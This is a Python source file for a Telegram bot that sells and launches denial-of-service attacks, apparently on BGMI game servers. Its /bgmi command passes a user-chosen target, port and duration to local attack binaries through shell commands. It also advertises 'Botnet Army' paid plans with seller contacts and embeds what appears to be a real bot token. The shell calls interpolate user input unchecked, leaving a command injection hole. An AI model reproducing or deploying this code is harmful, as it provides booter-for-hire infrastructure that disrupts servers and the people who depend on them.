import telebot
import subprocess
import datetime
import os
import time
import requests
from requests.exceptions import ReadTimeout
import sys

# Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
bot = telebot.TeleBot('7473015138:AAHeeQk4d3aRvEeEwPZ-oUhNixHzmy_LPNA')
# Replace '6d10776ea6f1060e4b1cb22f5196daa4' with your actual ScraperAPI key
SCRAPERAPI_KEY = 'YOUR_SCRAPERAPI_KEY'
ADMIN_IDS = {"6096060349"}  # Replace with your admin user IDs
USER_FILE = "users.txt"
LOG_FILE = "log.txt"
COOLDOWN_TIME = 300
bgmi_cooldown = {}
active_attacks = {}  # Dictionary to track active attacks

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return set(file.read().splitlines())
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USER_FILE, "w") as file:
        for user_id in users:
            file.write(f"{user_id}\n")

allowed_user_ids = read_users()

def log_command(user_id, target, port, duration):
    chat = bot.get_chat(user_id)
    username = f"@{chat.username}" if chat.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")

def clear_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as log_file:
            log_file.truncate(0)
        return "Logs cleared successfully ✅"
    return "Logs are already cleared. No data found."

def get_ip():
    scraperapi_url = 'http://api.scraperapi.com'
    params = {
        'api_key': SCRAPERAPI_KEY,
        'url': 'http://httpbin.org/ip'
    }
    response = requests.get(scraperapi_url, params=params)
    return response.json()['origin']

def restart_bot():
    python = sys.executable
    os.execl(python, python, *sys.argv)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in ADMIN_IDS and user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
            bot.reply_to(message, "You are on cooldown. Please wait 5 minutes before running the /bgmi command again.")
            return
        parts = message.text.split()
        if len(parts) == 4:
            target, port, duration = parts[1], int(parts[2]), int(parts[3])
            if duration > 240:
                response = "Error: Time interval must be less than 240."
            else:
                bgmi_cooldown[user_id] = datetime.datetime.now()
                log_command(user_id, target, port, duration)
                response = f"💀💀ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ💀💀.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
                bot.reply_to(message, response)
                attack_process = subprocess.Popen(f"./bgmi {target} {port} {duration} 200", shell=True)
                active_attacks[user_id] = attack_process
                time.sleep(5)
                subprocess.run(f"./SOUL {target} {port} {duration} 200", shell=True)
                new_ip = get_ip()
                bot.reply_to(message, f"IP changed to {new_ip}")
                return
        else:
            response = " 💀 Usage :- /bgmi <target> <port> <time> 💀"
    else:
        response = "Access to this command is restricted."
    bot.reply_to(message, response)

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id in active_attacks:
            active_attacks[user_id].terminate()
            del active_attacks[user_id]
            bot.reply_to(message, "Attack stopped successfully.")
        else:
            bot.reply_to(message, "No active attack to stop.")
    else:
        bot.reply_to(message, "You are not authorized to stop attacks.")

@bot.message_handler(commands=['help'])
def show_help(message):
    help_message = '''Commands ⌨️ :

⚠️ /rules - Essential usage rules
⚠️ /plans - Botnet plans & pricing
⚠️ /mylogs - Your attack history
⚠️ /bgmi - Access Bgmi servers
⚠️ /alive - to Restart the bot and make it alive again

  Admin Commands 🚷☢️☣️:
⚠️ /admincmd (Admins Only) - View admin commands

Buy From :- @Taras_1899, 
ADMIN :- Oscryptic , @Tadashi_18'''
    bot.reply_to(message, help_message)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    welcome_message = f"SUP Bitchhh? , {message.from_user.first_name}! .\n🤖Try To Run This Command : /help \n🚷☢️☣️ ADMIN :- Oscryptic"
    bot.reply_to(message, welcome_message)
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        allowed_user_ids.add(user_id)
        save_users(allowed_user_ids)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    rules_message = f"{message.from_user.first_name} Rules ⛔ :\n\n1. ᴀᴠᴏɪᴅ ᴇxᴄᴇꜱꜱɪᴠᴇ ᴀᴛᴛᴀᴄᴋꜱ ᴛᴏ ᴘʀᴇᴠᴇɴᴛ ʙᴇɪɴɢ ʙᴀɴɴᴇᴅ\n2. ᴅᴏ ɴᴏᴛ ʀᴜɴ ᴍᴜʟᴛɪᴘʟᴇ ᴀᴛᴛᴀᴄᴋꜱ ꜱɪᴍᴜʟᴛᴀɴᴇᴏᴜꜱʟʏ..."
    bot.reply_to(message, rules_message)

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        admin_message = '''🚷☢️Admin commands:
⚠️ /add <user_id> : Add a user to the allowed list.
⚠️ /clearlogs : Clear the logs.
⚠️ /broadcast <message> : Send a message to all users.'''
        bot.reply_to(message, admin_message)
    else:
        bot.reply_to(message, "Admin commands are not available for your user level.")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        parts = message.text.split()
        if len(parts) == 2:
            new_user_id = parts[1]
            allowed_user_ids.add(new_user_id)
            save_users(allowed_user_ids)
            bot.reply_to(message, f"User {new_user_id} added successfully.")
        else:
            bot.reply_to(message, "Usage: /add <user_id>")
    else:
        bot.reply_to(message, "Adding users is not permitted with your current access level.")

@bot.message_handler(commands=['clearlogs'])
def handle_clear_logs(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        response = clear_logs()
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to clear logs.")

@bot.message_handler(commands=['mylogs'])
def handle_mylogs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as log_file:
                logs = log_file.read()
                if logs:
                    bot.reply_to(message, f"Your recent logs:\n{logs}")
                else:
                    bot.reply_to(message, "No logs found.")
        except FileNotFoundError:
            bot.reply_to(message, "No logs found.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['plans'])
def handle_plans(message):
    plans_message = '''👾👾Botnet Army👾👾:
1. Basic:  ₹100/D - 100/day
2. Pro:  ₹130/D - 500/day
3. Unlimited: 200/D - Unlimited

Contact @Taras_1899 for more details.'''
    bot.reply_to(message, plans_message)

@bot.message_handler(commands=['alive'])
def handle_alive(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        bot.reply_to(message, "Restarting bot to keep it alive...")
        restart_bot()
    else:
        bot.reply_to(message, "You are not authorized to restart the bot.")

@bot.message_handler(commands=['broadcast'])
def handle_broadcast(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        parts = message.text.split(maxsplit=1)
        if len(parts) == 2:
            broadcast_message = parts[1]
            for uid in allowed_user_ids:
                try:
                    bot.send_message(uid, broadcast_message)
                except Exception as e:
                    print(f"Error sending message to {uid}: {e}")
            bot.reply_to(message, "Broadcast message sent to all users.")
        else:
            bot.reply_to(message, "Usage: /broadcast <message>")
    else:
        bot.reply_to(message, "You are not authorized to broadcast messages.")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id in active_attacks:
            active_attacks[user_id].terminate()
            del active_attacks[user_id]
            bot.reply_to(message, "Attack stopped successfully.")
        else:
            bot.reply_to(message, "No active attack to stop.")
    else:
        bot.reply_to(message, "You are not authorized to stop attacks.")

def polling():
    while True:
        try:
            bot.polling(none_stop=True, timeout=60, long_polling_timeout=30)
        except ReadTimeout:
            time.sleep(5)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    polling()
